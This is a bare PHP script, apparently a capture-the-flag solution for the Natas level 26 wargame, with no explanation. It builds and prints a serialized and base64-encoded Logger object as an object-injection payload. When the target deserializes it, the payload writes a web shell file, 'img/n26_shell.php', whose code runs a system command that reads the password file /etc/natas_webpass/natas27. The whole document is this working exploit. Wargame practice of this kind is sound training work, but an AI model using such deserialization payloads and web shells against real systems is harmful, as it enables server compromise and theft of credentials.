<?php
class Logger{
  private $logFile;
  private $initMsg;
  private $exitMsg;

  function __construct(){
    // initialise variables
    $this->initMsg="";
    $this->exitMsg="<?php System(\"cat /etc/natas_webpass/natas27;\"); ?>";
    $this->logFile = "img/n26_shell.php";
  }
}
 
$payload = new Logger("");
echo serialize($payload);
echo "\n";
echo "\n";
echo base64_encode(serialize($payload));
echo "\n";
echo "\n";
  
?>
